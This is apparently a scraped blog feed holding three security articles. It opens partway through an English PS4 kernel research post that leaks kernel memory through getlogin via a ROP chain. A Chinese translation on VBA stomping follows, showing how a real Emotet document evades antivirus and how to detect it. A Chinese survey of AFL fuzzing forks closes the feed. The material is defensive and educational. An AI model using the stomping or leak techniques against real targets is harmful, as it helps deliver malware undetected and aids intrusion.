&lt;= 0) || (uap-&gt;length &gt; sizeof(union auditon_udata))) return (EINVAL); Since mac_system_check_auditon and priv_check will never return ENOSYS, having the jailed check pass is the only way ENOSYS could be returned. When executing the chain, ENOSYS _is_ returned (0x48). This tells us that whatever sandbox system the PS4 uses is at least based on jails because the jailed check passes. FreeBSD 9.0 kernel exploitsBefore trying to look for new vulnerabilities in the FreeBSD 9.0 kernel source code, we should first check whether any of the kernel vulnerabilities already found could be used on the PS4. We can immediately dismiss some of these for obvious reasons: FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit - this won’t work since, as previously stated, we don’t have access to the ptrace system call. FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit - won’t work because the PS4 uses an AMD processor. FreeBSD Kernel - Multiple Vulnerabilities - maybe the first vulnerability will lead to something, but the other 2 rely on SCTP sockets, which the PS4 kernel has disabled (as previously stated). However, there are some smaller vulnerabilites, which could lead to something: getloginOne vulnerability which looks easy to try is using the getlogin system call to leak a small amount of kernel memory. The getlogin system call is intended to copy the login name of the current session to userland memory, however, due to a bug, the whole buffer is always copied, and not just the size of the name string. This means that we can read some uninitialised data from the kernel, which might be of some use. Note that the system call (49) is actually int getlogin_r(char *name, int len); and not char *getlogin(void);. So, let’s try copying some kernel memory into an unused part of userland memory: chain.syscall(&quot;getlogin&quot;, 49, chain.data, 17); Unfortunately 17 bytes is the most data we can get, since: Login names are limited to MAXLOGNAME (from &amp;lt;sys/param.h&amp;gt;) characters, currently 17 including null. – FreeBSD Man Pages After executing the chain, the return value was 0, which means that the system call worked! An excellent start. Now let’s take a look at the memory which we pointed to: Before executing the chain: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 After executing the chain: 72 6f 6f 74 00 fe ff ff 08 62 61 82 ff ff ff ff 00 After decoding the first 4 bytes as ASCII: root So the browser is executed as root! That was unexpected. But more interestingly, the memory leaked looks like a pointer to something in the kernel, which is always the same each time the chain is run; this is evidence to support Yifanlu’s claims that the PS4 has no Kernel ASLR! SummaryFrom the information currently available, the PS4’s kernel seems to be very similar to the stock FreeBSD 9.0 kernel. Importantly, the differences that are present appear to be from standard kernel configuration changes (such as disabling SCTP sockets), rather than from modified code. Sony have also added several of their own custom system calls to the kernel, but apart from this, the rest of the kernel seems fairly untouched. In this respect, I’m inclined to believe that the PS4 shares most of the same juicy vulnerabilities as FreeBSD 9.0’s kernel! Unfortunately, most kernel exploits cannot be triggered from the WebKit entry point that we currently have due to sandboxing constraints (likely to be just stock FreeBSD jails). And with FreeBSD 10 being out, it’s unlikely that anyone is stashing away any private exploits for FreeBSD 9, so unless a new one is suddenly released, we’re stuck with what is currently available. The best approach from here seems to be reverse engineering all of the modules which can be dumped, in order to document as many of Sony’s custom system calls as possible; I have a hunch that we will have more luck targeting these, than the standard FreeBSD system calls. Recently Jaicrab has discovered two UART ports on the PS4 which shows us that there are hardware hackers interested in the PS4. Although the role of hardware hackers has traditionally been to dump the RAM of a system, like with the DSi, which we can already do thanks to the WebKit exploit, there’s also the possibility of a hardware triggered kernel vulnerability being found, like geohot’s original PS3 hypervisor hack. It remains most likely that a kernel exploit will be found on the PS4 through system call vulnerabilities though. 原文地址]]></content>

    <title><![CDATA[VBA Stomping 简介]]></title>
    <url>%2F2019%2F04%2F30%2FVBA-Stomping%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[原文标题 VBA Stomping — Advanced Maldoc Techniques (Oct 6, 2018) 作者：Kirk Sayre @bigmacjpg，Harold Ogden @haroldogden 和 Carrie Roberts @OrOneEqualsOne VBA Stomping 是一种可以绕过反病毒检测恶意文档生成技术，它最初由 Vesselin Bontchev 博士引起我们的注意（见此处）。VBA stomping 是指销毁 Microsoft Office 文档中的 VBA 源代码，只留下文档文件中称为 p-code 的宏代码的编译版本。在这种情况下，仅基于VBA源代码的恶意文档检测会失败。在这篇博文中，我们将详细演示 VBA stomping 并介绍一些其他技术。 VBA Stomping首先，我们将在一个简单的非恶意宏上演示 VBA Stomping。此文档在打开时显示带有文本 ABC 的消息框。VBA 源代码和生成的消息框如下所示。 现在我们修改上面显示的VBA源代码，同时保持中间 p-code 不变。我们将集中讨论当前的 .docx/.xlsx/.docm/.xlsm（Office 2007 以上）格式。但是，此处讨论的技术可以轻松应用于较旧的 .doc/.xls格式。在 Office 2007 以上文件中，VBA 源代码和 p-code 通常位于名为 vbaProject.bin 的文件中。请注意这是默认文件名，可以被重命名。如果要手动修改此文件，我们需要首先解压 .docm/.xlsm 文件，然后在十六进制编辑器中打开 vbaProject.bin 文件。在此示例中，我们将 ABC 改为 XYZ，但仅限于存储 VBA 源代码的位置，而不是 p-code 部分。VBA 源代码以压缩形式存储，即下图中不可打印或奇怪的字符。 现在我们已经手动编辑了 VBA 源代码将 ABC 更改为 XYZ，我们打开文档并在单击“启用内容”按钮之前检查 VBA 源代码。 我们打开文档但未启用宏。在代码编辑器中检查宏，代码显示宏将显示带有文本 XYZ 的消息框，但事实并非如此。实际上，只要启用了内容，就会显示一个 ABC 的消息框，并且代码编辑器中的源代码会更新以匹配！ 源代码表示 XYZ 将显示在消息框中，但显示 ABC 。到底是怎么回事？ 正如 Bontchev 博士所解释的那样，只要 p-code 与系统上的当前 VBA 版本兼容，文档实际执行的是存储的 p-code。此外，宏编辑器中显示的内容（一旦启用内容）并不是解压的 VBA 源代码，而是反编译的 p-code。 如果我们在不同版本的 Word（使用不同的 VBA 版本）中打开文档，则 p-code 将不可重用。这将强制将 VBA 源代码解压缩并重新编译为 p-code，从而在消息框中显示 XYZ。所以现在我们有一个文档，在一个版本的Office上显示 ABC，但在另一个版本上显示 XYZ。 请注意，这很重要。使用 VBA Stomping 技术的恶意文档只能使用用于创建文档时相同的 VBA 版本执行。 我们可以通过在恶意文档生成之前对目标进行侦察来确定要使用的适当 Office 版本适当 Office 版本；或者通过生成具有多个 Office 版本的恶意文档并将其喷射到目标上来解决此限制。 从防守角度看 VBA stomping 是什么效果呢？通常恶意文档检测仅基于 VBA 源代码。甚至许多可用于分析文档的工具都无法识别 VBA 源和 p-code 之间的差异。由 Philippe Lagadec 编写的 olevba 脚本对篡改文档的分析仅显示了解压缩的源代码，且缺少 p-code 细节。 除非使用 p-code dumper 插件运行，否则 Didier Stevens 的 Python 脚本 oledump.py 也会给出类似的结果。在使用该插件的情况下，输出给出了一些指示，即 p-code 将使消息框显示 ABC，如下图所示。 Bontchev 博士发布了一个名为 pcodedmp.py 的 Python 脚本用于显示 p-code，如下图所示。输出可以显示操作名称而不是上面的操作码。 我们可以通过用零或随机字节覆盖 VBA 源代码来完全擦除（stomp），而不仅仅是修改它。以下截图显示了如何在十六进制编辑器中手动执行此操作。 在这种情况下，VBA 编辑器根本不显示宏代码，但启用内容后仍然显示带有文本 ABC 的消息框。现在，我们在此文件上重新运行 olevba，结果不显示任何VBA源代码，并显示“未找到可疑关键字或 IOC”，而不是之前突出显示我们在使用可疑关键字（AutoOpen）。 这个问题有多严重?我们现在将更深入地了解 Office 如何使用压缩的 VBA 源代码和 p-code。稍后当我们讨论如何滥用 Office 功能来轻松修改恶意文档以欺骗许多 AV 扫描时，这将会发挥作用。 Office 文档包含两个用于提取 VBA 的位置，即压缩的 VBA 源代码和 p-code。下表详细说明了在以下情况下使用哪个 VBA 数据源： 从该表中我们可以看到，如果我们有有效的 p-code，则在启用宏时它会忽略压缩的 VBA 源代码，并通过运行 p-code 来执行所有宏功能。作为攻击者，这告诉我们，我们可以完全破坏或修改压缩的 VBA 源代码，并且仍然让我们的恶意文档执行其指定的任务。 现实案例上述表明这适用于简单示例，但这真的是威胁吗？让我们通过使用已知的恶意文档将其提升到新的水平。在这种情况下，我们将从最近的 Emotet 恶意文档开始，它目前在 Virus total 上被 36/59 的供应商检测为恶意。 如果我们使用这个文档并且如上所述方法简单地处理 VBA 源代码，那么检测率将降至 58 种防病毒解决方案中的 7 种！ 如您所见，这给网络防御者带来了严重的问题。即使手动分析此类文档也可能存在问题。此时显而易见的问题是可以通过工具自动执行 VBA stomping 还是我们必须手动编辑 Office 文档？ 这个问题的答案是肯定的。我们开发了一个 POC 工具来自动在任何 Office 文档中处理压缩的 VBA 源代码（它被用于 VBA stomping 示例的 Emotet 文档，我们不会发布此实用程序）。考虑到自动化 VBA stomping 十分容易，这是一个真正的威胁。 变得更糟考虑恶意文档被设计为在执行恶意有效载荷之后立即关闭 MS Word 的情况。与 VBA stomping 结合使用时，没有脱机的 VBA 源代码提取工具将显示 VBA 源代码，并且在启用宏之前，VBA 源代码甚至不会显示在 Office 宏编辑器窗口中。但是启用宏会导致 Word 立即退出而不提供查看反编译源的机会。虽然我们已经证明“类似汇编”的 p-code 是可提取的，但是 p-code 很难解释，并且无法在 VBA 调试器中被分析。此外 p-code 仅在特定的VBA版本上运行。出于这些原因，访问 VBA 源代码对分析人员来说是一个很大的好处。但是如何才能为这样的文件做到这一点呢？ 经过一些实验，我们找到了一个简单的解决方案，可以在宏启用后立即停止 MS Word 执行任何方法。请注意，此解决方案适用于 Office 2007 以上的文档，我们研究解决较旧的文档格式。Office 2007 以上的解决方案是从 .docm 文件的 word 目录中删除 vbaData.xml 文件，如下所示（这可以通过 7-Zip 程序完成，而无需手动解压缩和重新压缩文档）。 现在我们可以打开文档并启用内容，从而在 VBA 代码编辑器中显示反编译的 p-code，但不执行代码。如果恶意软件作者已采取措施阻止分析人员访问 VBA 源代码，则这种方法可以节省时间。 删除 vbaData.xml 的一个有趣的副作用是它会导致 MS Word 在宏对话框中错误地列出没有宏（参见下图）。 检测我们编写了一个开源工具，用于检测名为 VBA Seismograph 的 Office 文档中的 VBA stomping。此工具已在 Ubuntu 16.04 下测试，它检测声明的函数/变量名称、字符串文字以及出现在已编译的 p-code 和 Office 文档的 VBA 源代码中的注释行之间的差异。该工具可在这里找到。 总结在这篇博客文章中，我们演示了如何修改或销毁 Office 文档中压缩的 VBA 源代码，来绕过 AV 扫描，并使恶意文档的手动分析更加困难。对此技术的防御涉及检测和标记具有有效 p-code 但无效或缺少 VBA 源代码的文档，或更一般地，检查压缩 VBA 源代码与反编译 p-code 之间的差异。目前，我们还没有发现任何进行此项检查的商用 AV 解决方案，因此这是 AV 扫描解决方案可以改进的领域。 参考资料 https://vbastomp.com/ 原文地址]]></content>

    <content type="text"><![CDATA[原文标题 Zoo AFL (Apr 24, 2019) 作者：@d1g1 本文主要讨论的不是经典 AFL 本身，而是为其设计的工具以及对其本身做出的改进，我们认为这些改进可以显著提高模糊测试的质量。如果你想知道如何提高 AFL 效率以及如何更快地找到更多漏洞，请继续阅读！（持续更新中） AFL 是什么，它有什么用？AFL是一个覆盖导向或基于反馈的模糊测试工具，关于这些概念的更多信息可以在参考这篇论文 Fuzzing: Art, Science, and Engineering。总结一下 AFL： 它改进可执行文件以了解它如何影响覆盖范围 变异输入数据以最大化覆盖范围 重复上一步以找到程序崩溃的位置 通过实践证明它非常有效 它易于使用 如果你不清楚 AFL 是什么的话，这里有一些资源帮助你上手和理解： 项目主页 AFL 练习 AFL Demo — 使用 AFL fuzz C++ 程序 AFL 发现的漏洞 —（截至 2017） 在这里你可以读到关于 AFL 在构建过程中添加到程序中的内容 一些关于 fuzz 网络程序的技巧 在写这篇文章时 AFL 的最新版本是2.52b。随着时间的推移，一些分支正在被纳入到 AFL 主分支。接下来我们会列举几个有用的附件工具。 关于 Rode0day 竞赛 Rode0day 竞赛每月举办一次，参赛者要在花费更少时间的情况下在预先制作的语料库（无论是否获取源代码）中找到最多的漏洞。就其本质而言，Rode0day 是 AFL 不同分支之间的争斗。 一些AFL用户指出，AFL 的作者 Michal Zalewski 显然已经放弃该项目， 因为上次的改进日期还得追溯到 2017 年 11 月 5 日。这可能与他离开 Google 并开展一些新项目有关。 因此用户开始为最新的版本 2.52b 制作新的补丁)。 AFL 还有不同的变体和衍生物，允许模糊测试 Python，Go，Rust，OCaml，GCJ Java，内核系统调用，甚至整个虚拟机。 AFL 对其它语言的支持 python-afl — Python afl.rs — Rust afl-fuzz-js — Javascript java-afl — Java kelinci — Java（相关文章） javan-warty-pig — JVM afl-swift — Swift ocamlopt-afl — OCaml sharpfuzz — .Net AFL 附属工具本节我们收集了 AFL 的各种脚本和工具，并将它们分为几类： 崩溃处理 afl-utils — 自动处理/分析崩溃和减少测试用例数量 afl-crash-analyzer — AFL 崩溃分析程序 fuzzer-utils — 分析结果 atriage — 简单的分类工具 afl-kit — Python 实现的 afl-cmin AFLize — 生成适合 AFL 的 debian 包的构建 afl-fid — 处理输入数据 代码覆盖率 afl-cov — 提供人性化的覆盖率数据 count-afl-calls — 使用脚本计算二进制文件中的插桩块数，评估其占比 afl-sancov — 类似于 afl-cov 但使用 clang的消毒机制（sanitizer） covnavi — 思科 Talos 开发的用于代码覆盖和分析的脚本 LAF LLVM Passes — 类似于 AFL 的补丁集合，可以改进代码使其更容易找到分支 一些用于最小化测试用例的脚本 afl-pytmin — 一个 afl-tmin 的包装器，它试图通过使用多 CPU 内核来加速最小化测试用例的过程 afl-ddmin-mod — 基于 ddmin 算法的 afl-tmin halfempty — 来自 Tavis Ormandy 基于并行化的快速最小化测试用例的程序 分布式执行 disfuzz-afl — AFL 的分布式模糊测试 AFLDFF — AFL 分布式模糊测试框架 afl-launch — AFL 多实例执行 afl-mothership — AWS 云上多同步 AFL 的管理和执行 afl-in-the-cloud — 另一个在 AWS 中运行 AFL 的脚本 VU_BSc_project — 使用 libFuzzer 和 AFL 对开源库进行模糊测试 最近有一篇文章 Scaling AFL to a 256 thread machine。 部署，管理，监控，报告 afl-other-arch — 用于添加对各种非x86体系结构的支持 afl-trivia — 简化 AFL 管理的脚本 afl-monitor — AFL 监控脚本 afl-manager — Python 实现的用于管理 multi-afl 的 Web 服务器 afl-tools — 带有 afl-latest, afl-dyninst 和 Triforce-afl 的 docker 镜像 afl-remote — 远程管理 AFL 实例的 Web 服务器 包装器（wrapper） phuzzer - 基于 Python 与 AFL 交互 AFL 改进AFL 对漏洞研究人员和模糊测试本身产生了巨大的影响，他们开始根据原始 AFL 进行改进。在不同的情况下，与原始AFL相比，每个改进都有其自身的优缺点。 几乎所有改进版本可以在 hub.docker.com 找到。 目的是什么？ 提高速度并/或提高代码覆盖率 算法 环境 操作系统 硬件 无源码环境 代码模拟 代码插桩 静态 动态 AFL 默认模式在继续研究 AFL 的不同改进和分支之前，我们必须讨论两种重要的模式，这些模式在过去也有过改进但最终被合并。它们是 Syzygy 和 QEMU。 Syzygy 模式 — instrument.exe 中工作的模式1instrument.exe --mode=afl --input-image=test.exe --output-image=test.instr.exe Syzygy 允许使用 AFL 静态重写 PE32 二进制文件，但需要符号和额外环境的才能识别 WinAFL 内核。 QEMU 模式 — QEMU 下的工作方式见 Internals of AFL fuzzer — QEMU Instrumentation使用 QEMU 实现对二进制文件的支持在版本 1.31b 中被添加到 AFL 处理流程上游。AFL QEMU 模式使用 QEMU tcg（一个微小的代码生成器）二进制转换引擎的二进制插桩功能。为此，AFL 有一个 QEMU 的构建脚本，它提取特定版本 QEMU（2.10.0）的源代码，将它们放到几个小的补丁上，并为指定架构构建。然后，创建名为 afl-qemu-trace 的文件，该文件实际上是 QEMU 用户模式模拟（仅可执行ELF文件）的文件。因此，AFL 可以使用不同体系架构（QEMU 支持）中 elf 二进制文件的反馈进行模糊测试。此外，还有许多 AFL 工具，比如从显示器上获取有关当前会话的信息，以及 afl-analyze 等高级内容。但同时 AFL 也会受到 QEMU 的局限， 比如如果工具链使用硬件 SoC 功能构建文件（该功能启动二进制并且 QEMU 不支持），则只要有特定指令或使用特定 MMIO，模糊测试就会中断。 这里是 QEMU 模式的另一个有趣的分支，其中使用TCG代码插桩和缓存，速度提高了3-4倍。 分支AFL 的分支首先与经典 AFL 算法的变化和改进有关。 pe-afl — 对在 Windows 操作系统中没有源代码的 PE 文件进行模糊测试的改进。fuzzer 使用 IDA Pro 分析目标程序，并生成用于接下来静态插桩的信息。然后用 AFL 对插桩后的程序进行模糊测试。 afl-cygwin — 尝试使用 Cygwin 将经典 AFL 移植到Windows。然而它有很多错误且很慢，作者已经放弃了开发 AFLFast（使用 Power Schedule 扩展 AFL） — 最早的 AFL 分支之一。它增加了启发式功能，允许它在短时间内通过更多路径 FairFuzz — AFL 的扩展，针对难抵达的分支（利用Branch Mask） AFLGo — AFL 的扩展，获取代码的某些部分而不是完整的程序覆盖，可用于测试补丁或新添加的代码片段 PerfFuzz — AFL 的扩展，用于查找可能显着减慢程序速度的测试用例 Pythia — AFL 的扩展，预测找到新路径的难度 Angora — 最新的 fuzzer 之一，用 Rust 语言编写，使用新的策略进行变异并增加覆盖范围。 Neuzz — 用神经网络进行模糊测试 UnTracer-AFL — 将 AFl 与 UnTracer 集成以进行有效跟踪 Qsym — 针对混合模糊测试的实用混合执行（concolic execution）引擎。从本质上讲，它是一个符号执行引擎（基本组件作为 intel pin 的插件来实现），它与 AFL 一起执行混合模糊测试。这是基于反馈的模糊测试演变的一个阶段，需要单独讨论。它的主要优点是可以相对快速地进行混合执行。这是由于本机执行命令而没有代码、快照和一些启发式的中间表示。它使用旧版本的Intel pin（由于 libz3 和其他 DBT 之间的支持问题），目前支持ELF x86 和 x86_64 架构 Superion — 灰盒模糊测试器，其优点是除了插桩程序外，它还使用 ANTLR 语法获取输入数据的规范，然后在此语法的帮助下执行变异 AFLSmart — 另一个灰盒模糊测试器，它以 Peach 使用的格式获得输入数据的规范 有许多研究论文致力于实现 AFL 被改进的新方法和模糊测试技术。由于它们只有白皮书，所以我们甚至没有提到这些。如果你愿意，你可以搜索它们。例如最新的一些有 CollAFL: Path Sensitive Fuzzing、EnFuzz、Efficient approach to fuzzing interpreters、ML 用于 AFL 等。 基于 QEMU 的改进 TriforceAFL — AFL/QEMU对系统完全模拟来进行模糊测试。是由 nccgroup 提供的一个分支。它允许在 QEMU 模式下对整个操作系统进行模糊测试。它是通过一个特殊指令（aflCall (0f 24)）（在 QEMU x64 CPU 中添加）实现的。然而它不再受支持; 支持 AFL 的最后一个版本是2.06b TriforceLinuxSyscallFuzzer — Linux 系统调用的模糊测试 afl-qai — 一个带有 QEMU 增强插桩（qai）的小型演示项目。 基于 KLEE 的改进 kleefl — 通过符号执行生成测试用例（在大程序上非常慢） 基于 Unicorn 的改进 afl-unicorn — 允许通过在 Unicorn Engine 上模拟代码片段进行模糊测试 我们在实践中成功使用了 AFL 的这种改进，由于目标是在 SOC 上执行的某个 RTOS（real-time operating system，实时操作系统）的代码区域，因此我们无法使用QEMU模式。在我们没有源代码的情况下（我们无法构建用于解析器分析的独立二进制文件）并且程序不直接获取输入数据（例如，数据被加密或是如在 CGC 二进制文件中的信号样本），然后我们可以逆向并找到所谓的位置函数，函数中中数据以便于模糊测试器使用的格式进行处理。这是 AFL 最普遍/通用的修改，即它允许模糊测试任何东西。它独立于架构、源、输入数据格式和二进制格式（例如裸机，只是来自控制器内存的代码片段）。研究人员首先检查这个二进制文件并编写一个模糊测试器，它在解析过程的输入端模拟状态。显然与 AFL 不同，这需要对二进制进行一定的检查。对于裸机固件，如 Wi-FI 或基带，我们需要记住一些缺点： 我们必须本地处理控制和的检查 模糊测试器的状态是保存在内存转储中的内存状态，这可以防止模糊测试器进入某些路径 动态内存调用没有消毒，但它可以手动实现，它将取决于 RTOS（必须进行研究） 未模拟任务内 RTOS 交互，这也可能阻止寻找某些路径 使用这种修改的例子有： afl-unicorn: Fuzzing Arbitrary Binary Code afl-unicorn: Part 2 — Fuzzing the ‘Unfuzzable’ unicorefuzz 使用 afl-unicorn 来 fuzz 内核 在我们继续基于动态二进制检测（DBI）框架进行修改之前，不要忘记这些框架的最快速度由 DynamoRIO，Dynlnst 以及 PIN 实现。 基于 PIN 的改进 aflpin — 采用 Intel PIN 插桩的 AFL afl_pin_mode — 另一个采用 Intel PIN 插桩的 AFL afl-pin — 采用 PINtool 的 AFL NaFl — AFL 模糊测试器的克隆（基本核心） PinAFL — 该工具的作者试图将 AFL 移植到 Windows，以便对已编译的二进制文件进行模糊测试。该项目好像是为了好玩而在一夜之间完成的且未进一步发展。存储库里没有源文件，只有已编译的二进制文件和启动指令。我们不知道它基于哪个版本的 AFL，它只支持 32 位应用程序。 正如我们所看到的，AFL 有许多不同的修改，但它们在现实生活中并不是非常有用。 基于 Dyninst 的改进afl-dyninst — AFL + Dyninst == AFL 黑盒模糊测试。这个版本的特点是首先使用 Dyninst 对一个研究过的程序（没有源代码）进行静态插桩（静态二进制插桩，静态二进制重写），然后使用经典 AFL 进行模糊测试，AFL 会认为程序是用 afl-gcc/afl-g++/afl-as 构建的。因此，它在没有源代码的情况下以非常好的生产率工作：与本地编译相比，经典 AFL 是 0.25 倍的速度。与QEMU相比，它具有显着优势：它允许动态链接库的插桩，而 QEMU 只能插桩与库静态链接的基本可执行文件。然而现在它只支持 Linux，如果增加对于 Windows 支持，则需要对 Dyninst 本身进行更改，这个工作正在进行中。 还有另一个分支具有提升的速度和某些功能（AARCH64 和 PPC 架构的支持）。 基于 DynamoRIO 的改进 drAFL — AFl + DynamoRIO – 在 Linux 上没有源代码的模糊测试 afl-dr — 基于 DynamoRIO 的另一种实现，在 Habr 上有很好的描述 afl-dynamorio — 来自 vanhauser-thc 的修改。 据他所说：“当正常的 afl-dyninst 能够使二进制崩溃并且 QEMU 模式 -Q 无法执行时，用 DynamoRIO 运行 AFL。”它支持 ARM 和 AARCH64。DynamoRIO 比 QEMU 慢大约 10 倍，比 dyninst 慢 25 倍，但比 Pintool 快 10 倍。 WinAFL — 最著名的 AFL分支。（DynamoRIO，也是 syzygy 模式）。这个修改的出现只是时间问题，因为许多人想在 Windows 上尝试 AFL 并将其应用于没有源代码的应用程序。目前，这个工具正在被积极改进，尽管 AFL 代码库（撰写本文时为 2.43b）相对过时，但它都有助于发现多个漏洞（CVE-2016-7212，CVE-2017-0073，CVE- 2017-0190，CVE-2017-11816）。Google Zero Project 团队和 MSRC 漏洞与解决团队的专家正在参与此项目，因此我们希望它能够得到进一步的发展。开发人员使用动态插桩（基于DynamoRIO）而不是编译时插桩，这显着减慢了被分析软件的执行速度，但产生的开销（加倍）与二进制模式下的经典 AFL 相当。他们还解决了快速启动过程的问题，称其为持续模糊测试模式；他们选择对函数进行模糊测试（通过文件内部的偏移或导出表中存在的函数名称）并对其进行插桩，以便可以在循环中调用它，从而启动多个输入数据样本而无需重新启动程序。最近发表的一篇文章描述了作者如何使用 WinAFL 在约 50 天内发现约 50 个漏洞。发布之后很快 WinAFL 就支持 Intel PT（Processor Tracing，处理器跟踪）模式，在这里可以找到细节信息。 专业读者可能注意到这些改进使用了除了Frida之外的各种流行的插桩框架。 唯一提到 Frida 与 AFL 的结合使用是在 Chizpurfle: A Gray-Box Android Fuzzer for Vendor Service Customizations 中找到的。 带 Frida 的 AFL 版本非常有用，因为 Frida 支持多种 RISC 架构。 许多研究者也期待由 Capstone，Unicorn 和 Keystone 的创建者发布的 DBI Scopio 框架。基于这个框架，作者已经创建了一个模糊测试器（Darko），据他们说能够成功地使用它来对嵌入式设备进行模糊测试。有关这方面的更多信息，请参阅 Digging Deep: Finding 0days in Embedded Systems with Code Coverage Guided Fuzzing。 基于处理器硬件特征的改进关于支持处理器硬件功能的 AFL 修改方面，首先，它允许对内核代码进行模糊测试；其次，它允许在没有源代码的情况下更快地对应用程序进行模糊测试。 当然，谈到处理器硬件功能，我们最感兴趣的是 Intel PT。从第 6 代处理器开始（大约自2015年起）支持该功能。 因此，为了能够使用下面列出的模糊测试器，我们需要一个支持 Intel PT 的处理器。 WinAFL-IntelPT — 使用 Intel PT 而不是 DynamoRIO 的第三方 WinAFL。 ptfuzzer - 使用 Intel PT 对二进制进行黑盒测试。 kAFL — 一个旨在解决独立于操作系统的模糊测试内核时的覆盖率导向问题的学术项目。 它通过使用管理程序（hypervisor）和 Intel PT 来解决该问题。有关它的更多信息可以在白皮书 kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels 中找到。 AFL 具体应用 GUSTAVE - 一个嵌入式操作系统内核的 Fuzzer，基于 QEMU 和 AFL。 使用 AFL 对嵌入式系统的 TEE 进行模糊测试。PDF-operating-systems%20using-AFL.pdf) YOUTUBE Janus - 基于 AFL 和 Syzkaller 对 linux 的文件系统进行模糊测试， 支持 8 种文件系统 ext4、XFS、btrfs、F2FS、GFS2、HFS+、ReiserFS 和 vFAT；以及 34 个文件操作的系统调用。 利用 AFL 模糊测试 statzone。地址 利用 AFL 模糊测试 Linux 内核。地址 FIRM-AFL - 基于 AFL 实现的用于 IoT 固件灰盒模糊测试的工具。PDF 对 OP-TEE 的系统调用接口进行模糊测试。地址 利用 WinAFL 对二进制程序进行模糊测试，利用内存访问热图来精简输入种子大小。地址 FuzzFactory - AFL 扩展, 使用 Waypoints 针对特定领域进行通用的以覆盖率位导向的模糊测试。YOUTUBE Paper PowerFL - PowerFL = AFL + QEMU + VxWorks，使用 AFL 和 QEMU 对 PowerPC 和 Intel i386 VxWorks 进行 fuzz。 frida-js-afl-instr - 使用 AFL++ 和 Frida 进行 Linux 内存中的模糊测试。 总结如你所见，研究人员仍在积极地改进 AFL，而且 AFL 还存在进行实验和创新的空间，我们也可以创建一个我们自己的实用有趣的 AFL。 感谢阅读，祝大家 Fuzz 顺利。 原文链接]]></content>
